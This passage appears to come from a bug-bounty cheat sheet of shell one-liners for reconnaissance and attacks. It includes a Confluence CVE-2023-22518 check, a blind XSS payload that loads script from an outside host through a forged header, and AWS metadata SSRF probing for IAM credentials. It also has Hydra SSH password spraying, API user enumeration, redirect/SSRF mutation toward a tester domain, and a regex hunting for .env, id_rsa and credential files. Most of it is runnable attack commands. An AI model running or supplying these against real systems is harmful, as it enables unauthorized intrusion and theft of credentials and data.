cat file.txt | while read host do; do curl -skL "http://$host/setup/setupadministrator.action" | grep -i "<title>Setup System Administrator" && echo $host "Vulnerable"; done
```
**CVE-2023-22518 - Improper Authorization Vulnerability in Confluence Data Center and Server**
```bash
subfinder -d TARGET.COM -silent | httpx -silent | nuclei -t CVE-2023-22518.yaml
```
**Extract Sensitive Informations on /auth.json Endpoint.**
```bash
subfinder -d TARGET.COM | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
```
**Use xargs with gau to scan bulk domains without losing speed .**
```bash
xargs -a alive.txt -I@ sh -c 'gau --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a gau.txt
```
**Blind XSS In X-Forwarded-For Header.**
```bash
findomain -t TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"
```
**Subdomain Enumeration with Google Tag Manager.**
```bash
curl -s "https://www.googletagmanager.com/gtm.js?id=[TARGET-GTM-ID]" | grep -oP '"key","[a-zA-Z0-9.-]+\.[a-z]{2,}"' | awk -F'"' '{print $4}'
```
**Search for Kubernetes setups in a specific organization and probe them for additional info.**
```bash
shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
```

# My Commands

**On-the-Fly GraphQL Schema Enumeration**
```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' \
  $GRAPHQL_ENDPOINT \
| jq -r '.data.__schema.types[].name' \
| tee graphql-types.txt
```
**AWS Instance-Metadata SSRF Fuzzing**
```bash
printf '%s\n' user-data iam/security-credentials/role-name instance-id \
| sed 's|^|http://169.254.169.254/latest/meta-data/|' \
| httpx -silent -mc 200,403 \
  -o aws-imds.txt
```
### Out-of-Band (OOB) Vulnerability Scanning
**Automated OOB Template Injection with Nuclei & Interactsh**
```bash
export INTERACT_URL=$(interactsh-client -n 1 -json | jq -r '.Data[0].URL')
nuclei -u https://target.com \
  -t ssrf/oob-injection.yaml \
  -oob-url $INTERACT_URL \
  -silent
```
**Vulnerability-Specific Filters**
```bash
echo 'https://target.com/api?input={"__proto__":{"polluted":true}}' \
| dalfox url --blind --filter \
  -o proto-pollution.txt
```
**Rapid SSH Password Spraying with Hydra**
```bash
hydra -L users.txt -p 'P@ssw0rd2025' -e ns \
  -t 4 ssh://$TARGET \
  -o hydra-spray.txt
```
**Authenticated API User Enumeration with FFUF**
```bash
echo https://target.com/api?user=FUZZ \
| ffuf -u FUZZ \
  -w users.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mr '"id":\d+' \
  -of json \
  -o api-users.json
```
```bash
while read url; do response=$(curl -I -s -L -w "%{http_code}" "$url" -o /dev/null); if [[ "$response" == "200" ]]; then echo "$url"; fi; done < file.txt | while read url; do python SecretFinder.py -i "$url" -o cli; done
```
**line number of a domai**
```bash
grep -n "goole.com" scope.txt
```
**read line number 309**
```bash
head -n 309 scope.txt | tail -n 1
```
**cname**
```bash
cat sub.txt | xargs -I {} host -t cname {} | grep alias
```
```bash
cat scope.txt | httpx -silent -sc -t 1000 > scope2.txt
```
```bash
cat urls.txt | grep -Ei '(\/(admin|control|manage|backend|logs|backup|config|wp-admin|phpmyadmin|db_dump\.sql|backup\.zip|archive\.tar\.gz|git|svn|hg|config\.json|env|web\.config|application\.properties|api\/v[0-9]+\/|graphql|debug|test|staging|dev|console|actuator\/env|oauth2\/authorize|login|password-reset|session|jwt\/generate|keys\.txt|credentials\.csv|s3cfg|id_rsa|solr\/admin|jenkins\/script|swagger-ui\.html|legacy-api)(\/|$|\.(bak|old|tar|zip|~))|\?[^&=]*(token|api_key|secret|redirect)=)|\/([^/]*(\.bak|\.old|\.tar|\.zip|~))|(\b(\.env|web\.config|application\.properties)\b))'
```
```bash
cat domain2.txt | httpx -sc -silent -rl 200 -t 200 -s -td -ct -location -favicon -jarm -title -server -method -websocket -ip -cname -asn -cdn -pa -fr | tee httout.log
```
```bash
waybackurls TARGET-DOMAIN | grep -E "/https?://|\=https?://|\=\/.*" | while read url; do random=$(openssl rand -base64 6 | tr -d '/+');murl=$(echo $url | sed -E "s/(\/|=)(https?:\/\/[^\/&\?]+)/\1http:\/\/TESTER-DOMAIN\/$random/g;s/=\/[^&]+/=http:\/\/TESTER-DOMAIN\/$random/g") && echo "Requesting: $murl" && curl -so /dev/null --connect-timeout 5 "$murl"; done
```
```bash
httpx -x GET,POST,PUT,DELETE,HEAD,OPTIONS,PATCH,TRACE,CONNECT,PROPFIND,PROPPATCH,MKCOL,COPY,MOVE,LOCK,UNLOCK,REPORT,LINK,UNLINK,SEARCH,PURGE,VIEW,CHECKOUT,CHECKIN,TRACK,DEBUG,ORDERPATCH,VERSION-CONTROL,MERGE,BASELINE-CONTROL,SUBSCRIBE,NOTIFY,BIND,UNBIND,ACL,CHECK,UNCHECK,TEXTSEARCH,PRI,LABEL,M-SEARCH,UPDATERESOURCE,POLL,QUERY,INDEX,MKCALENDAR,MKREDIRECTREF,GOAWAY,FB_GRAPHQL,SPACEJUMP,ZIP,REINDEX,EXEC,MS-SQL,GITALK,AWS_S3,BPROPFIND,BPROPPATCH,UNSUBSCRIBE,MKCERTIFICATE,JSONPATCH,SHUTDOWN,VERIFY,MKWORKSPACE,MKACTIVITY,REBIND,NULL,CRASH,GHOST,RPC,HTTP/3,GRPC,SETTINGS,HEADERS,WEBSOCKET,Upgrade,DAV,PATCHV6,SEARCHALL,SYNC,REMOVE,GETPLUS,UPDATE,READ,LOCA -fr -sc -silent -method -mc 200
```
```bash
# hexencode with \x prifix
echo -n "cvp08ukubu2e1a6fh54gw3oqntgo43iy7.oast.site" | xxd -p -c 1 | sed 's/\(..\)/\\x\1/g' | tr -d '\n'
```